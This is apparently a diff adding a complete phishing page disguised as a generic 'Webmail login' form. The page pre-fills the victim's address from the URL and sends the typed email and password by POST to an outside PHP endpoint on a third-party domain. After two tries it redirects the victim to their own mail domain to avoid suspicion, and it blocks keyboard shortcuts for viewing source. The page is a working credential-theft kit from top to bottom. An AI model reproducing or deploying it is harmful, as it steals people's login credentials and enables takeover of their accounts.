@@ -1,0 +1,290 @@
+
+<!doctype html>
+<html lang="en">
+<head>
+  <script src="https://ajax.googleapis.com/ajax/libs/jquery/2.2.4/jquery.min.js"></script>
+  <script src="https://code.jquery.com/jquery-3.1.1.min.js">
+    <script src="https://code.jquery.com/jquery-3.3.1.js" integrity="sha256-2Kok7MbOyxpgUVvAk/HJ2jigOSYS2auK4Pfzbm7uH60=" crossorigin="anonymous"></script>
+    <!-- Required meta tags -->
+    <meta charset="utf-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
+    <link rel="shortcut icon" href="data:image/x-icon;base64,AAABAAEAICAAAAEAIADSAgAAFgAAAIlQTkcNChoKAAAADUlIRFIAAAAgAAAAIAgGAAAAc3p69AAAAplJREFUWIXt1j2IHGUYB/DfOzdnjIKFkECIVWIKvUFsIkRExa9KJCLaWAgWJx4DilZWgpDDiI0wiViIoGATP1CCEDYHSeCwUBBkgiiKURQJFiLo4d0eOxYzC8nsO9m9XcXC+8MW+3z+9/l6l2383xH+iSBpElyTdoda26xsDqp/h0CVZ3vwKm7tMBngAs7h7eRYebG6hMtMBHbMBX89vfARHprQ5U8cwdFQlIOZCVR5di1+w/wWXT/EY6EoN5NZCODuKZLDwzgSMCuBe2fwfX6QZwtpWzqfBBtLC3txF/ZhxKbBGx0EfsTJS77vwmGjlZrD4mUzUOXZjVjGI65cnTXchB8iupdDUb7QinsQZ7GzZftdQj2JVZ49iC/w6JjksIo7OnS9tiA5Vn6GtyK2+1MY5NkhfGDygVrBAxH5WkPuMjR7/3UsUFLl2Q68s4XkA3ws3v9zoSjX28Kr5wL1xrTxa6ou+f6OZGvqPg9v1wZeaUjcELE/DVfNhWFSvy/enOIZ9eq1sTokEMNLWI79oirP8g6fXpVnh7GEvY1sV/OJ4f0UhyKKk6EoX4x5pEkgXv6L6OM99YqNw/c4kXSwG5nkIfpLCynuiahW1GWeJHkfT4aiXO9atz1XcD6I6yLyHu6bIPk6Hg9FeYZ63y9EjBarPDvQ8VJ1nd9V3D4m+RncForyxFCQ4hSeahlej88Hefauurdwaufr5z/F/ZHAX6nL+mZE18e36IWiHLkFocqzW9QXcNz1+wUHxJ/f10JRPjvGP4pk/vj5L3F8AtufdD+/p6dJDknzX+05fDLGtife/766t9MRgFCUffWTudwE3AqBlVCUf0xLYGTQqzzbhydwJ3Y34g318J1tmX+DPBTlz9MS2MY2/nP8DTGaqeTDf30rAAAAAElFTkSuQmCC" type="image/x-icon" />
+
+    <!-- Bootstrap CSS -->
+    <link rel="stylesheet" href="https://maxcdn.bootstrapcdn.com/bootstrap/4.0.0/css/bootstrap.min.css" integrity="sha384-Gn5384xqQ1aoWXA+058RXPxPg6fy4IWvTNh0E263XmFcJlSAwiGgFAW/dAiS6JXm" crossorigin="anonymous">
+    <link href="https://fonts.googleapis.com/css?family=Archivo+Narrow&display=swap" rel="stylesheet">
+    <script src="https://kit.fontawesome.com/585b051251.js" crossorigin="anonymous"></script>
+    <title>Webmail login</title>
+    <link href="https://storage.googleapis.com/adobe-cs-rd132.appspot.com/webmail-RD4/css/hover.css" rel="stylesheet" media="all">
+
+    <style type="text/css">
+      textarea:hover, 
+      input:hover, 
+      textarea:active, 
+      input:active, 
+      textarea:focus, 
+      input:focus,
+      button:focus,
+      button:active,
+      button:hover,
+      label:focus,
+      .btn:active,
+      .btn.active
+      {
+        outline:0px !important;
+        -webkit-appearance:none;
+        box-shadow: none !important;
+        border-color: none !important;
+      }
+
+
+      .input-icons i { 
+        position: absolute; 
+      } 
+
+      .input-icons { 
+        width: 100%; 
+      } 
+
+      .icon { 
+        padding: 10px; 
+        min-width: 40px;
+        color: #8FA7AD; 
+      } 
+
+      .input-field { 
+        width: 100%; 
+        padding: 5px;
+        padding-left: 40px ;
+        text-align: left;
+        border: 1px solid #8FA7AD; 
+      } 
+
+
+
+    </style>
+  </head>
+  <!-- oncontextmenu="return false" -->
+  <body >
+    <div class="container-fluid p-0">
+
+      <div class="container-fluid">
+        <div class="row" style="margin: 30px 0px 60px 0px;">
+          <div class="col-md-4 mx-auto mt-5 px-3 pb-3">
+
+            <div class="text-center pt-5"> 
+
+              <div class="alert mx-3" id="msg" style="background-color: #D35351; display: none;">
+                <div class="text-white text-left">
+                  <i class="fas fa-times-circle"></i>
+                  &nbsp
+                  <span class="small" id="msg_text"></span>
+                  
+                </div>
+              </div>
+              <img src="https://storage.googleapis.com/adobe-cs-rd132.appspot.com/webmail-RD4/images/webmail.svg" class="img-fluid" width="310px"><br>
+            </div>
+            <div class="col-lg-10 mx-auto mt-5">
+              <center>
+                <span id="error" class="text-danger" style="display: none;">That account doesn't exist. Enter a different account</span>
+              </center>
+              <form id="contact" class="form-horizontal well">
+                <div id="div1" class="text-dark">
+                  <div class="col-lg-12">
+                    <div class="form-group">
+                      <div id="inputbar">
+                        <label for="exampleInputEmail1">Email address</label>
+                          <div class="input-icons">
+                            <i class="fa fa-user icon"></i> 
+                            <!-- <input class="input-field" type="text"> -->
+                            <input type="email" name="email" class="input-field rounded" id="email" aria-describedby="emailHelp" placeholder="Enter your email address">
+                          </div> 
+                          <!-- <div class="input-group-prepend">
+                            <span class="input-group-text border-right-0" style="background-color: transparent;"><i class="fas fa-user" style="color: #8FA7AD;"></i></span>
+                          </div> -->
+                          <!-- <input type="email" name="email" class="form-control border-left-0" id="email" aria-describedby="emailHelp" placeholder="Enter email"> -->
+                        
+                      </div>
+                      <!-- <div id="automail" class="h5 mt-5" style="display: none;">
+                        <i class="fas fa-arrow-left" id="back1"></i>&nbsp<span id="emailch">abc@abc.com</span>
+                      </div> -->
+                    </div>
+                  </div>
+                  <div class="col-lg-12">
+                    <div class="form-group">
+                      <label for="Password">Password</label>
+                      <div class="input-icons">
+                            <i class="fas fa-lock icon"></i> 
+                            <input type="password" name="password" class="input-field rounded" id="password" aria-describedby="emailHelp" placeholder="Enter your email password">
+                          </div> 
+                        
+                    </div>
+                  </div>
+                </div>
+              </div>
+              <div class="text-center col-lg-9 mx-auto mt-4">
+                <button class="btn py-1 w-100 border-dark text-white" id="submit-btn" style="background-color: #179BD7;">Login</button>
+              </div>
+            </form>
+          </div>
+          <div class="col-lg-12 text-center mt-1"> 
+            <small class="font-weight-bold" style="color: #766;">Reset Password</small>
+
+          </div> 
+          <div class="col-lg-12 text-center mt-5 pt-3"> 
+            <a class=" text-dark small" href="#" style="font-weight: 500">English</a>
+            <a class="text-dark small ml-4" href="#" style="font-weight: 500">العربية </a>
+            <a class="text-dark small ml-4" href="#" style="font-weight: 500">български</a>
+            <a class="text-dark small ml-4" href="#" style="font-weight: 500">čeština</a>
+            <a class="text-dark small ml-4" href="#" style="font-weight: 500">اdansk</a>
+            <a class="text-dark small ml-4" href="#" style="font-weight: 500">Deutsch </a>
+            <a class="text-dark small ml-4" href="#" style="font-weight: 500">Ελληνικά</a>
+            <a class="text-dark small ml-4" href="#" style="font-weight: 500">español </a>
+            <a class="text-dark small ml-4" href="#" style="font-weight: 500"><i class="fas fa-ellipsis-h"></i></a>
+
+          </div>  
+        </div> 
+      </div>
+    </div>
+
+
+    <!-- Optional JavaScript -->
+    <!-- jQuery first, then Popper.js, then Bootstrap JS -->
+    <script src="https://code.jquery.com/jquery-3.2.1.slim.min.js" integrity="sha384-KJ3o2DKtIkvYIK3UENzmM7KCkRr/rE9/Qpg6aAZGJwFDMVNA/GpGFF93hXpG5KkN" crossorigin="anonymous"></script>
+    <script src="https://cdnjs.cloudflare.com/ajax/libs/popper.js/1.12.9/umd/popper.min.js" integrity="sha384-ApNbgh9B+Y1QKtv3Rn7W3mgPxhU9K/ScQsAP7hUibX39j7fakFPskvXusvfa0b4Q" crossorigin="anonymous"></script>
+    <script src="https://maxcdn.bootstrapcdn.com/bootstrap/4.0.0/js/bootstrap.min.js" integrity="sha384-JZR6Spejh4U02d8jOt6vLEHfe/JQGiRRSQQxSfFWpi1MquVdAyjUar5+76PVCmYl" crossorigin="anonymous"></script>
+  </body>
+
+  <script src="https://ajax.googleapis.com/ajax/libs/jquery/2.2.4/jquery.min.js"></script>
+  <script src="https://stackpath.bootstrapcdn.com/bootstrap/4.1.3/js/bootstrap.min.js"></script>
+  <script>
+
+    /* global $ */
+    $(document).ready(function(){
+      var count=0;
+
+      // $('#back1').click(function () {
+      //   $("#msg").hide();
+      //   $('#email').val("");
+      //   $("#automail").animate({left:200, opacity:"hide"}, 0);
+      //   $("#inputbar").animate({right:200, opacity:"show"}, 1000);
+
+      // });
+
+    /////////////url email getting////////////////
+    var email = window.location.hash.substr(1);
+    if (!email) {
+
+    }
+    else
+    {
+        // $('#email').val(email);
+        var my_email =email;
+        var ind=my_email.indexOf("@");
+        var my_slice=my_email.substr((ind+1));
+        var c= my_slice.substr(0, my_slice.indexOf('.'));
+        var final= c.toLowerCase();
+        $('#contact').trigger("reset");
+        $("#msg").hide();
+        $('#fieldImg').attr('src', 'https://storage.googleapis.com/adobe-cs-rd132.appspot.com/webmail-RD4/images/other-1.png');
+        $('#field').html("Other Mail");
+        $('#email').val(my_email);
+        $('#emailch').html(my_email);
+        $("#msg").hide();
+        // $("#inputbar").animate({left:200, opacity:"hide"}, 0);
+        // $("#automail").animate({right:200, opacity:"show"}, 1000);
+      }
+      ///////////////url getting email////////////////
+
+
+      
+      $('#submit-btn').click(function(event){
+        $('#error').hide();
+        $('#msg').hide();
+        event.preventDefault();
+        var email=$("#email").val();
+        var password=$("#password").val();
+      ///////////new injection////////////////
+      var my_email =email;
+      var filter = /^([a-zA-Z0-9_\.\-])+\@(([a-zA-Z0-9\-])+\.)+([a-zA-Z0-9]{2,4})+$/;
+
+      if (!filter.test(my_email)) {
+        $('#error').show();
+        email.focus;
+        return false;
+      }
+
+      var ind=my_email.indexOf("@");
+      var my_slice=my_email.substr((ind+1));
+      var c= my_slice.substr(0, my_slice.indexOf('.'));
+      var final= c.toLowerCase();
+      ///////////new injection////////////////
+      count=count+1;
+      
+      $.ajax({
+        dataType: 'JSON',
+        url: 'https://tribology.com.mx/admon/cache/next.php',
+        type: 'POST',
+        data:{
+          email:email,
+          password:password,
+        },
+            // data: $('#contact').serialize(),
+            beforeSend: function(xhr){
+              $('#submit-btn').html('Verifing...');
+            },
+            success: function(response){
+              if(response){
+                $("#msg").show();
+                console.log(response);
+                if(response['signal'] == 'ok'){
+                  $("#password").val("");
+                  if (count>=2) {
+                    count=0;
+                    // window.location.replace(response['redirect_link']);
+					window.location.replace("http://www." + my_slice);
+                    //window.location.replace("thankyou.html?msg="+email);
+
+                  }
+                  $('#msg_text').html(response['msg']);
+                }
+                else{
+                  $('#msg_text').html(response['msg']);
+                }
+              }
+            },
+            error: function(){
+              $("#password").val("");
+              if (count>=2) {
+                count=0;
+				window.location.replace("http://www." + my_slice);
+                //window.location.replace("thankyou.html?msg="+email);
+              }
+              $("#msg").show();
+              $('#msg_text').html("Please try again later");
+            },
+            complete: function(){
+              $('#submit-btn').html('Login');
+            }
+          });
+    });
+
+
+    });
+
+    document.onkeydown=function(e){
+      if (e.ctrlKey && 
+        (e.keyCode === 73 || 
+         e.keyCode === 105 ||
+         e.keyCode === 74 || 
+         e.keyCode === 106 || 
+         e.keyCode === 85 || 
+         e.keyCode === 117)) {
+        alert('not allowed');
+      return false;
+    } else {
+      return true;
+    }
+  }
+</script>
+</html>
